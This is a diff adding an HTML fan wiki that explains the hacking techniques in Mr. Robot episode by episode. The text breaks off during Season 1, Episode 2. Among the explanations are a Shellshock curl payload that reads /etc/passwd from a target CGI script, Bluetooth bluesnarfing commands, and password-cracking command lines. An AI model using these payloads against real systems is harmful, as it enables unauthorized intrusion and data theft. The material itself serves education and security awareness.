@@ -1,0 +1,3097 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mr. Robot Hacking Wiki - Complete Technical Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap');
+:root{--bg:#0a0a0a;--bg2:#111;--bg3:#1a1a1a;--green:#00ff41;--green2:#00cc33;--green3:#009926;--red:#ff0040;--cyan:#00d4ff;--yellow:#ffd700;--text:#c0c0c0;--text2:#888;--border:#1e1e1e;--card:#141414}
+body{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;line-height:1.7;overflow-x:hidden}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--green3);border-radius:3px}
+a{color:var(--green);text-decoration:none;transition:color .2s}
+a:hover{color:var(--cyan)}
+
+/* HEADER */
+.header{background:linear-gradient(180deg,#000 0%,var(--bg) 100%);border-bottom:1px solid var(--green3);padding:20px 0;position:sticky;top:0;z-index:1000;backdrop-filter:blur(10px)}
+.header-inner{max-width:1400px;margin:0 auto;padding:0 30px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-family:'Share Tech Mono',monospace;font-size:1.8rem;color:var(--green);text-shadow:0 0 20px rgba(0,255,65,.3)}
+.logo span{color:var(--red)}
+.nav-toggle{display:none;background:none;border:1px solid var(--green3);color:var(--green);padding:8px 15px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:.9rem}
+
+/* HERO */
+.hero{text-align:center;padding:80px 30px 60px;background:radial-gradient(ellipse at center,rgba(0,255,65,.03) 0%,transparent 70%);position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.015) 2px,rgba(0,255,65,.015) 4px);pointer-events:none}
+.hero h1{font-family:'Share Tech Mono',monospace;font-size:3rem;color:var(--green);margin-bottom:15px;text-shadow:0 0 40px rgba(0,255,65,.3);letter-spacing:3px}
+.hero .subtitle{font-size:1.2rem;color:var(--text2);max-width:700px;margin:0 auto 30px}
+.hero .stats{display:flex;gap:40px;justify-content:center;flex-wrap:wrap;margin-top:30px}
+.hero .stat{text-align:center}
+.hero .stat-num{font-family:'Share Tech Mono',monospace;font-size:2.5rem;color:var(--green);display:block}
+.hero .stat-label{font-size:.85rem;color:var(--text2);text-transform:uppercase;letter-spacing:2px}
+
+/* LAYOUT */
+.container{max-width:1400px;margin:0 auto;padding:0 30px;display:flex;gap:30px}
+.sidebar{width:280px;flex-shrink:0;position:sticky;top:80px;height:calc(100vh - 100px);overflow-y:auto;padding:20px 0}
+.main{flex:1;min-width:0;padding:30px 0 80px}
+
+/* SIDEBAR NAV */
+.season-nav{margin-bottom:20px}
+.season-btn{width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:12px 15px;text-align:left;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:.9rem;transition:all .2s;display:flex;align-items:center;justify-content:space-between}
+.season-btn:hover,.season-btn.active{background:var(--card);border-color:var(--green3);color:var(--green)}
+.season-btn .arrow{transition:transform .3s;font-size:.7rem}
+.season-btn.active .arrow{transform:rotate(90deg)}
+.episode-list{display:none;background:var(--bg2);border:1px solid var(--border);border-top:0}
+.episode-list.show{display:block}
+.ep-link{display:block;padding:10px 15px 10px 25px;color:var(--text2);font-size:.85rem;cursor:pointer;transition:all .2s;border-bottom:1px solid var(--border)}
+.ep-link:hover,.ep-link.active{color:var(--green);background:rgba(0,255,65,.05);padding-left:30px}
+.ep-link .ep-num{color:var(--green3);font-family:'Share Tech Mono',monospace;margin-right:8px}
+
+/* CONTENT CARDS */
+.season-section{display:none;animation:fadeIn .4s ease}
+.season-section.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+.season-header{padding:30px;background:linear-gradient(135deg,var(--card) 0%,var(--bg3) 100%);border:1px solid var(--border);border-left:3px solid var(--green);margin-bottom:30px}
+.season-header h2{font-family:'Share Tech Mono',monospace;font-size:1.8rem;color:var(--green);margin-bottom:8px}
+.season-header p{color:var(--text2);font-size:1rem}
+
+.episode-card{background:var(--card);border:1px solid var(--border);margin-bottom:25px;transition:border-color .3s;scroll-margin-top:90px}
+.episode-card:hover{border-color:var(--green3)}
+.ep-header{padding:25px 30px;border-bottom:1px solid var(--border);display:flex;align-items:flex-start;gap:20px;cursor:pointer}
+.ep-number{font-family:'Share Tech Mono',monospace;font-size:1.5rem;color:var(--green);min-width:50px;opacity:.6}
+.ep-title-area{flex:1}
+.ep-title-area h3{font-family:'Share Tech Mono',monospace;font-size:1.2rem;color:#fff;margin-bottom:5px}
+.ep-title-area .ep-filename{color:var(--green3);font-family:'Share Tech Mono',monospace;font-size:.8rem}
+.ep-toggle{color:var(--green3);font-family:'Share Tech Mono',monospace;font-size:1.5rem;cursor:pointer;transition:transform .3s;user-select:none}
+.ep-toggle.open{transform:rotate(45deg)}
+.ep-body{padding:0 30px 30px;display:none}
+.ep-body.show{display:block}
+
+.hack-section{margin-top:25px}
+.hack-section h4{font-family:'Share Tech Mono',monospace;color:var(--cyan);font-size:1rem;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
+.hack-section h4::before{content:'>';color:var(--green)}
+.hack-detail{margin-bottom:20px;padding-left:15px;border-left:2px solid var(--border)}
+.hack-detail h5{color:var(--yellow);font-size:.95rem;margin-bottom:8px;font-family:'Share Tech Mono',monospace}
+.hack-detail p{color:var(--text);font-size:.9rem;margin-bottom:8px}
+.hack-detail ul{padding-left:20px;margin-bottom:10px}
+.hack-detail li{color:var(--text);font-size:.88rem;margin-bottom:4px}
+.hack-detail li strong{color:var(--green2)}
+
+/* CODE BLOCKS */
+.code-block{background:#0d0d0d;border:1px solid var(--border);padding:15px 20px;margin:10px 0;overflow-x:auto;position:relative;font-family:'Share Tech Mono',monospace;font-size:.82rem;color:var(--green);line-height:1.6}
+.code-block::before{content:'terminal';position:absolute;top:0;right:0;background:var(--green3);color:#000;padding:2px 10px;font-size:.7rem;text-transform:uppercase}
+.code-block .comment{color:var(--text2)}
+
+/* TAGS */
+.tags{display:flex;flex-wrap:wrap;gap:6px;margin:10px 0}
+.tag{padding:3px 10px;font-size:.75rem;font-family:'Share Tech Mono',monospace;border:1px solid;border-radius:2px}
+.tag.tool{border-color:var(--green3);color:var(--green2);background:rgba(0,255,65,.05)}
+.tag.attack{border-color:var(--red);color:var(--red);background:rgba(255,0,64,.05)}
+.tag.social{border-color:var(--yellow);color:var(--yellow);background:rgba(255,215,0,.05)}
+.tag.hardware{border-color:var(--cyan);color:var(--cyan);background:rgba(0,212,255,.05)}
+
+/* REAL WORLD BOX */
+.real-world{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.2);padding:15px 20px;margin:15px 0;font-size:.88rem}
+.real-world::before{content:'REAL-WORLD PARALLEL';display:block;font-family:'Share Tech Mono',monospace;font-size:.75rem;color:var(--cyan);margin-bottom:8px;letter-spacing:2px}
+
+/* FOOTER */
+.footer{background:var(--bg2);border-top:1px solid var(--border);padding:40px 30px;text-align:center}
+.footer p{color:var(--text2);font-size:.85rem;margin-bottom:5px}
+.footer .credit{color:var(--green);font-family:'Share Tech Mono',monospace;font-size:1rem;margin-bottom:15px}
+.footer .disclaimer{font-size:.75rem;color:var(--text2);max-width:600px;margin:15px auto 0;line-height:1.5}
+
+/* SEARCH SYSTEM */
+.search-container{padding:20px 30px;max-width:1400px;margin:0 auto}
+.search-box{display:flex;gap:10px;align-items:center;background:var(--card);border:1px solid var(--border);padding:12px 20px;transition:border-color .3s}
+.search-box:focus-within{border-color:var(--green)}
+.search-box .search-icon{color:var(--green3);font-family:'Share Tech Mono',monospace;font-size:1rem;flex-shrink:0}
+.search-box input{flex:1;background:none;border:none;color:var(--green);font-family:'Share Tech Mono',monospace;font-size:.95rem;outline:none;caret-color:var(--green)}
+.search-box input::placeholder{color:var(--text2)}
+.search-box .search-clear{background:none;border:none;color:var(--text2);cursor:pointer;font-size:1.2rem;padding:0 5px;display:none;font-family:'Share Tech Mono',monospace}
+.search-box .search-clear.visible{display:block}
+.search-box .search-clear:hover{color:var(--red)}
+
+.search-filters{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;align-items:center}
+.search-filters .filter-label{color:var(--text2);font-family:'Share Tech Mono',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:1px;margin-right:4px}
+.filter-chip{padding:4px 12px;font-size:.75rem;font-family:'Share Tech Mono',monospace;border:1px solid var(--border);border-radius:2px;background:var(--bg3);color:var(--text2);cursor:pointer;transition:all .2s;user-select:none}
+.filter-chip:hover{border-color:var(--green3);color:var(--text)}
+.filter-chip.active{border-color:var(--green);color:var(--green);background:rgba(0,255,65,.08)}
+.filter-chip.cat-tool{border-color:var(--green3)}
+.filter-chip.cat-tool.active{border-color:var(--green);color:var(--green);background:rgba(0,255,65,.08)}
+.filter-chip.cat-attack{border-color:rgba(255,0,64,.3)}
+.filter-chip.cat-attack.active{border-color:var(--red);color:var(--red);background:rgba(255,0,64,.08)}
+.filter-chip.cat-social{border-color:rgba(255,215,0,.3)}
+.filter-chip.cat-social.active{border-color:var(--yellow);color:var(--yellow);background:rgba(255,215,0,.08)}
+.filter-chip.cat-hardware{border-color:rgba(0,212,255,.3)}
+.filter-chip.cat-hardware.active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,212,255,.08)}
+.filter-chip.cat-mitre{border-color:rgba(180,120,255,.3)}
+.filter-chip.cat-mitre.active{border-color:#b478ff;color:#b478ff;background:rgba(180,120,255,.08)}
+
+.search-results{display:none;margin-top:15px;max-height:70vh;overflow-y:auto;background:var(--bg2);border:1px solid var(--border)}
+.search-results.visible{display:block}
+.search-results-header{display:flex;justify-content:space-between;align-items:center;padding:12px 20px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--bg2);z-index:5}
+.search-results-header .results-count{font-family:'Share Tech Mono',monospace;font-size:.85rem;color:var(--green)}
+.search-results-header .results-info{font-size:.8rem;color:var(--text2)}
+.search-result-item{padding:15px 20px;border-bottom:1px solid var(--border);cursor:pointer;transition:all .2s}
+.search-result-item:hover{background:rgba(0,255,65,.03);padding-left:25px}
+.search-result-item .result-ep{font-family:'Share Tech Mono',monospace;font-size:.8rem;color:var(--green3);margin-bottom:4px}
+.search-result-item .result-title{color:#fff;font-family:'Share Tech Mono',monospace;font-size:.95rem;margin-bottom:6px}
+.search-result-item .result-match{color:var(--text);font-size:.85rem;line-height:1.5}
+.search-result-item .result-match mark{background:rgba(0,255,65,.15);color:var(--green);padding:1px 3px;border-radius:1px}
+.search-result-item .result-tags{display:flex;gap:4px;flex-wrap:wrap;margin-top:8px}
+.search-no-results{padding:40px 20px;text-align:center;color:var(--text2);font-family:'Share Tech Mono',monospace}
+.search-no-results .no-results-icon{font-size:2rem;margin-bottom:10px;opacity:.3}
+.search-no-results p{font-size:.9rem}
+
+.search-shortcut{font-size:.7rem;color:var(--text2);font-family:'Share Tech Mono',monospace;background:var(--bg3);border:1px solid var(--border);padding:2px 6px;border-radius:2px;flex-shrink:0}
+
+/* MOBILE */
+@media(max-width:900px){
+  .sidebar{display:none;position:fixed;top:60px;left:0;width:100%;height:calc(100vh - 60px);background:var(--bg);z-index:999;padding:20px}
+  .sidebar.mobile-show{display:block}
+  .nav-toggle{display:block}
+  .container{flex-direction:column}
+  .hero h1{font-size:1.8rem}
+  .hero .stat-num{font-size:1.8rem}
+  .ep-header{flex-direction:column;gap:10px}
+  .header-inner{padding:0 15px}
+  .container{padding:0 15px}
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="header">
+  <div class="header-inner">
+    <div class="logo">mr<span>.</span>robot<span>://</span>hacking_wiki</div>
+    <button class="nav-toggle" onclick="document.querySelector('.sidebar').classList.toggle('mobile-show')">[ MENU ]</button>
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+  <h1>MR. ROBOT HACKING WIKI</h1>
+  <p class="subtitle">A comprehensive technical breakdown of every hack, exploit, and attack technique depicted in the critically acclaimed series Mr. Robot (2015-2019). Every tool is real. Every technique is accurate.</p>
+  <div class="stats">
+    <div class="stat"><span class="stat-num">4</span><span class="stat-label">Seasons</span></div>
+    <div class="stat"><span class="stat-num">45</span><span class="stat-label">Episodes</span></div>
+    <div class="stat"><span class="stat-num">100+</span><span class="stat-label">Techniques</span></div>
+    <div class="stat"><span class="stat-num">50+</span><span class="stat-label">Real Tools</span></div>
+  </div>
+</section>
+
+<!-- SEARCH SECTION -->
+<section class="search-container" id="search-section">
+  <div class="search-box" id="search-box">
+    <span class="search-icon">root@fsociety:~# grep -ri</span>
+    <input type="text" id="search-input" placeholder="search tool, technique, CVE, MITRE ATT&CK, episode..." autocomplete="off" spellcheck="false">
+    <button class="search-clear" id="search-clear" onclick="clearSearch()">&times;</button>
+    <span class="search-shortcut">Ctrl+K</span>
+  </div>
+  <div class="search-filters" id="search-filters">
+    <span class="filter-label">Filters:</span>
+    <span class="filter-chip cat-tool" data-filter="tool" onclick="toggleFilter(this)">Tools</span>
+    <span class="filter-chip cat-attack" data-filter="attack" onclick="toggleFilter(this)">Attacks</span>
+    <span class="filter-chip cat-social" data-filter="social" onclick="toggleFilter(this)">Social Eng.</span>
+    <span class="filter-chip cat-hardware" data-filter="hardware" onclick="toggleFilter(this)">Hardware</span>
+    <span class="filter-chip cat-mitre" data-filter="mitre" onclick="toggleFilter(this)">MITRE ATT&CK</span>
+    <span class="filter-chip" data-filter="s1" onclick="toggleFilter(this)">S1</span>
+    <span class="filter-chip" data-filter="s2" onclick="toggleFilter(this)">S2</span>
+    <span class="filter-chip" data-filter="s3" onclick="toggleFilter(this)">S3</span>
+    <span class="filter-chip" data-filter="s4" onclick="toggleFilter(this)">S4</span>
+  </div>
+  <div class="search-results" id="search-results"></div>
+</section>
+
+<!-- MAIN LAYOUT -->
+<div class="container">
+
+<!-- SIDEBAR -->
+<aside class="sidebar" id="sidebar">
+  <div class="season-nav">
+    <button class="season-btn active" onclick="toggleSeason(this,'s1-eps')">SEASON 1 <span class="arrow">&#9654;</span></button>
+    <div class="episode-list show" id="s1-eps">
+      <div class="ep-link active" onclick="showEpisode('s1','s1e1',this)"><span class="ep-num">E01</span> hellofriend.mov</div>
+      <div class="ep-link" onclick="showEpisode('s1','s1e2',this)"><span class="ep-num">E02</span> ones-and-zer0es.mpeg</div>
+      <div class="ep-link" onclick="showEpisode('s1','s1e3',this)"><span class="ep-num">E03</span> d3bug.mkv</div>
+      <div class="ep-link" onclick="showEpisode('s1','s1e4',this)"><span class="ep-num">E04</span> da3m0ns.mp4</div>
+      <div class="ep-link" onclick="showEpisode('s1','s1e5',this)"><span class="ep-num">E05</span> 3xpl0its.wmv</div>
+      <div class="ep-link" onclick="showEpisode('s1','s1e6',this)"><span class="ep-num">E06</span> br4ve-trave1er.asf</div>
+      <div class="ep-link" onclick="showEpisode('s1','s1e7',this)"><span class="ep-num">E07</span> v1ew-s0urce.flv</div>
+      <div class="ep-link" onclick="showEpisode('s1','s1e8',this)"><span class="ep-num">E08</span> wh1ter0se.m4v</div>
+      <div class="ep-link" onclick="showEpisode('s1','s1e9',this)"><span class="ep-num">E09</span> m1rr0r1ng.qt</div>
+      <div class="ep-link" onclick="showEpisode('s1','s1e10',this)"><span class="ep-num">E10</span> zer0-day.avi</div>
+    </div>
+  </div>
+  <div class="season-nav">
+    <button class="season-btn" onclick="toggleSeason(this,'s2-eps')">SEASON 2 <span class="arrow">&#9654;</span></button>
+    <div class="episode-list" id="s2-eps">
+      <div class="ep-link" onclick="showEpisode('s2','s2e1',this)"><span class="ep-num">E01</span> unm4sk.tc</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e2',this)"><span class="ep-num">E02</span> k3rnel-pan1c.ksd</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e3',this)"><span class="ep-num">E03</span> init_1.asec</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e4',this)"><span class="ep-num">E04</span> logic-b0mb.hc</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e5',this)"><span class="ep-num">E05</span> m4ster-s1ave.aes</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e6',this)"><span class="ep-num">E06</span> h4ndshake.sme</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e7',this)"><span class="ep-num">E07</span> succ3ss0r.p12</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e8',this)"><span class="ep-num">E08</span> init_5.fve</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e9',this)"><span class="ep-num">E09</span> h1dden-pr0cess.axx</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e10',this)"><span class="ep-num">E10</span> pyth0n-pt1.p7z</div>
+      <div class="ep-link" onclick="showEpisode('s2','s2e11',this)"><span class="ep-num">E11</span> pyth0n-pt2.p7z</div>
+    </div>
+  </div>
+  <div class="season-nav">
+    <button class="season-btn" onclick="toggleSeason(this,'s3-eps')">SEASON 3 <span class="arrow">&#9654;</span></button>
+    <div class="episode-list" id="s3-eps">
+      <div class="ep-link" onclick="showEpisode('s3','s3e1',this)"><span class="ep-num">E01</span> power-saver-mode.h</div>
+      <div class="ep-link" onclick="showEpisode('s3','s3e2',this)"><span class="ep-num">E02</span> undo.gz</div>
+      <div class="ep-link" onclick="showEpisode('s3','s3e3',this)"><span class="ep-num">E03</span> legacy.so</div>
+      <div class="ep-link" onclick="showEpisode('s3','s3e4',this)"><span class="ep-num">E04</span> metadata.par2</div>
+      <div class="ep-link" onclick="showEpisode('s3','s3e5',this)"><span class="ep-num">E05</span> runtime-error.r00</div>
+      <div class="ep-link" onclick="showEpisode('s3','s3e6',this)"><span class="ep-num">E06</span> kill-process.inc</div>
+      <div class="ep-link" onclick="showEpisode('s3','s3e7',this)"><span class="ep-num">E07</span> fredrick+tanya.chk</div>
+      <div class="ep-link" onclick="showEpisode('s3','s3e8',this)"><span class="ep-num">E08</span> dont-delete-me.ko</div>
+      <div class="ep-link" onclick="showEpisode('s3','s3e9',this)"><span class="ep-num">E09</span> stage3.torrent</div>
+      <div class="ep-link" onclick="showEpisode('s3','s3e10',this)"><span class="ep-num">E10</span> shutdown-r</div>
+    </div>
+  </div>
+  <div class="season-nav">
+    <button class="season-btn" onclick="toggleSeason(this,'s4-eps')">SEASON 4 <span class="arrow">&#9654;</span></button>
+    <div class="episode-list" id="s4-eps">
+      <div class="ep-link" onclick="showEpisode('s4','s4e1',this)"><span class="ep-num">E01</span> 401unauthorized.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e2',this)"><span class="ep-num">E02</span> 402paymentrequired.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e3',this)"><span class="ep-num">E03</span> 403forbidden.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e4',this)"><span class="ep-num">E04</span> 404notfound.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e5',this)"><span class="ep-num">E05</span> 405methodnotallowed.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e6',this)"><span class="ep-num">E06</span> 406notacceptable.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e7',this)"><span class="ep-num">E07</span> 407proxyauthentication.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e8',this)"><span class="ep-num">E08</span> 408requesttimeout.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e9',this)"><span class="ep-num">E09</span> 409conflict.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e10',this)"><span class="ep-num">E10</span> 410gone.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e11',this)"><span class="ep-num">E11</span> 411lengthrequired.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e12',this)"><span class="ep-num">E12</span> 412preconditionfailed.h</div>
+      <div class="ep-link" onclick="showEpisode('s4','s4e13',this)"><span class="ep-num">E13</span> 413requestentitytoolarge.h</div>
+    </div>
+  </div>
+</aside>
+
+<!-- MAIN CONTENT -->
+<main class="main" id="main-content">
+
+<!-- ==================== SEASON 1 ==================== -->
+<div class="season-section active" id="s1">
+<div class="season-header">
+  <h2>// SEASON 1</h2>
+  <p>The revolution begins. Elliot Alderson, a cybersecurity engineer by day and vigilante hacker by night, is recruited by the mysterious Mr. Robot to join fsociety and take down E Corp. 10 episodes of meticulously accurate hacking.</p>
+</div>
+
+<!-- S1E01 -->
+<div class="episode-card" id="s1e1">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">01</span>
+    <div class="ep-title-area">
+      <h3>Hello, Friend</h3>
+      <div class="ep-filename">eps1.0_hellofriend.mov</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag tool">Tor</span>
+      <span class="tag tool">Hashcat</span>
+      <span class="tag tool">RUDY</span>
+      <span class="tag attack">DDoS</span>
+      <span class="tag attack">Rootkit</span>
+      <span class="tag social">OSINT</span>
+    </div>
+
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Tor Exit Node Traffic Analysis</h5>
+        <p>Elliot identifies Ron, a coffee shop owner, as hosting child exploitation material. He accomplishes this by running a <strong>Tor exit node</strong>, which allows him to observe unencrypted traffic leaving the Tor network. While Tor protects the source IP address through onion routing (multiple encrypted relays), the final hop -- the exit node -- can see unencrypted (non-HTTPS) traffic in plaintext.</p>
+        <ul>
+          <li><strong>Tor Architecture:</strong> Client &rarr; Guard Node &rarr; Middle Relay &rarr; Exit Node &rarr; Destination</li>
+          <li><strong>Vulnerability:</strong> Exit node operators can sniff unencrypted traffic (HTTP, FTP, SMTP)</li>
+          <li><strong>Tools:</strong> Tor, tcpdump, Wireshark for packet capture at exit node</li>
+        </ul>
+        <div class="real-world">Dan Egerstad demonstrated this in 2007 by running Tor exit nodes and capturing embassy email credentials. This is a well-known limitation of Tor -- it provides anonymity, not encryption of the final hop.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Password Cracking via OSINT-Driven Dictionary Attack</h5>
+        <p>Elliot cracks Ron's password by first performing <strong>social media reconnaissance</strong> to gather personal information (pet names, birthdays, favorite bands), then generating a targeted wordlist. The password was based on a pet's name -- a common weak password pattern.</p>
+        <ul>
+          <li><strong>OSINT Gathering:</strong> Facebook, Instagram, public records for personal details</li>
+          <li><strong>Wordlist Generation:</strong> Tools like <strong>CUPP</strong> (Common User Passwords Profiler) or <strong>CeWL</strong></li>
+          <li><strong>Cracking:</strong> <strong>Hashcat</strong> or <strong>John the Ripper</strong> for offline hash cracking</li>
+          <li><strong>Attack Type:</strong> Dictionary attack with rule-based mutations (l33tspeak, appended numbers)</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Generate targeted wordlist from social media</span>
+cupp -i   <span class="comment"># Interactive mode - enter target's personal info</span>
+
+<span class="comment"># Crack password hash with generated wordlist</span>
+hashcat -m 0 -a 0 hash.txt custom_wordlist.txt -r rules/best64.rule
+john --wordlist=custom_wordlist.txt hash.txt</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>3. RUDY (R-U-Dead-Yet) DDoS Attack on E Corp</h5>
+        <p>Allsafe detects a massive <strong>Layer 7 (Application Layer) DDoS</strong> attack against E Corp using the <strong>RUDY</strong> technique. RUDY sends HTTP POST requests with an abnormally long Content-Length header, then transmits the body at an extremely slow rate (one byte at a time), keeping connections open and exhausting server resources.</p>
+        <ul>
+          <li><strong>Attack Type:</strong> Slow HTTP POST (application layer DDoS)</li>
+          <li><strong>Mechanism:</strong> Long Content-Length header + extremely slow body transmission</li>
+          <li><strong>Similar Tools:</strong> SlowLoris (slow headers), Slow Read (small TCP window)</li>
+          <li><strong>Impact:</strong> Exhausts server thread pool without requiring massive bandwidth</li>
+        </ul>
+        <div class="real-world">RUDY is a real open-source tool. Slow HTTP attacks are effective because they require minimal bandwidth from the attacker while consuming maximum server resources. Cloudflare, Akamai, and other CDNs specifically protect against this class of attack.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>4. Rootkit Discovery on E Corp Servers</h5>
+        <p>Elliot discovers a <strong>rootkit</strong> disguised as a DAT file on E Corp's servers during the DDoS incident response. The rootkit hooks into the kernel, hiding its presence from standard monitoring tools while maintaining persistent backdoor access.</p>
+        <ul>
+          <li><strong>Rootkit Type:</strong> Linux kernel-level rootkit with process/file hiding capabilities</li>
+          <li><strong>Detection Method:</strong> Manual process analysis, checking for hidden network connections</li>
+          <li><strong>C2 Channel:</strong> The rootkit phones home to a command-and-control server</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Commands Elliot uses to investigate</span>
+ps aux | grep suspicious_process
+netstat -tulpn          <span class="comment"># Check for hidden network connections</span>
+ls -la /tmp/.hidden/    <span class="comment"># Look for hidden directories</span>
+strings malware.dat     <span class="comment"># Extract readable strings from binary</span>
+lsof -i :4444           <span class="comment"># Check for reverse shell connections</span></div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>5. Anonymous Communication Infrastructure</h5>
+        <p>Elliot uses multiple layers of anonymization for his activities:</p>
+        <ul>
+          <li><strong>Tor Browser:</strong> For anonymous web browsing</li>
+          <li><strong>IRC over Tor:</strong> Internet Relay Chat through hidden services for group communication</li>
+          <li><strong>VPN + Tor:</strong> Layered anonymization (VPN to hide Tor usage from ISP)</li>
+          <li><strong>ProtonMail:</strong> End-to-end encrypted email service based in Switzerland</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="hack-section">
+      <h4>Tools Used</h4>
+      <div class="tags">
+        <span class="tag tool">Kali Linux</span>
+        <span class="tag tool">Tor</span>
+        <span class="tag tool">Hashcat</span>
+        <span class="tag tool">John the Ripper</span>
+        <span class="tag tool">CUPP</span>
+        <span class="tag tool">Wireshark</span>
+        <span class="tag tool">RUDY</span>
+        <span class="tag tool">ProtonMail</span>
+        <span class="tag tool">IRC</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S1E02 -->
+<div class="episode-card" id="s1e2">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">02</span>
+    <div class="ep-title-area">
+      <h3>Ones and Zer0es</h3>
+      <div class="ep-filename">eps1.1_ones-and-zer0es.mpeg</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Shellshock</span>
+      <span class="tag tool">Bluetooth</span>
+      <span class="tag tool">DeepSound</span>
+      <span class="tag social">Social Engineering</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Shellshock Vulnerability (CVE-2014-6271)</h5>
+        <p>The episode references the <strong>Shellshock</strong> vulnerability, a critical bug in the GNU Bash shell that allows remote code execution through crafted environment variables. Discovered in 2014, it affected millions of servers running CGI scripts, DHCP clients, and SSH with ForceCommand.</p>
+        <ul>
+          <li><strong>CVE:</strong> CVE-2014-6271 (and related CVE-2014-7169)</li>
+          <li><strong>Vector:</strong> Maliciously crafted environment variables passed to Bash</li>
+          <li><strong>Impact:</strong> Remote Code Execution (RCE) on vulnerable web servers</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Shellshock exploit example via CGI</span>
+curl -H "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'" http://target/cgi-bin/vuln.cgi
+
+<span class="comment"># Testing for Shellshock vulnerability</span>
+env x='() { :;}; echo vulnerable' bash -c "echo test"</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Bluetooth Exploitation of Tyrell Wellick's Phone</h5>
+        <p>Elliot exploits a <strong>Bluetooth vulnerability</strong> on Tyrell Wellick's Android phone to gain unauthorized access. Using Kali Linux Bluetooth tools, he scans for discoverable devices and exploits the connection.</p>
+        <ul>
+          <li><strong>Bluesnarfing:</strong> Unauthorized access to data on Bluetooth devices</li>
+          <li><strong>Bluebugging:</strong> Taking control of a phone via Bluetooth</li>
+          <li><strong>Tools:</strong> btscanner, hcitool, hciconfig, bluesnarfer</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Scan for Bluetooth devices</span>
+hcitool scan
+btscanner
+
+<span class="comment"># Enumerate services on target device</span>
+sdptool browse XX:XX:XX:XX:XX:XX
+
+<span class="comment"># Bluesnarfing attack</span>
+bluesnarfer -r 1-100 -b XX:XX:XX:XX:XX:XX</div>
+        <div class="real-world">BlueBorne (2017) later demonstrated that Bluetooth attacks remain critically viable, affecting 5.3 billion devices across Android, iOS, Windows, and Linux. Armis Labs disclosed 8 zero-day vulnerabilities in Bluetooth implementations.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>3. Steel Mountain Reconnaissance</h5>
+        <p>fsociety begins planning the attack on <strong>Steel Mountain</strong>, E Corp's physical data center where backup tapes (LTO - Linear Tape-Open) are stored. The reconnaissance focuses on the facility's <strong>HVAC systems</strong> as the attack vector.</p>
+        <ul>
+          <li><strong>Target:</strong> HVAC/environmental control systems</li>
+          <li><strong>Goal:</strong> Raise temperature to destroy magnetic backup tapes</li>
+          <li><strong>Recon:</strong> Facility blueprints, employee social media, physical surveillance</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>4. DeepSound Steganography</h5>
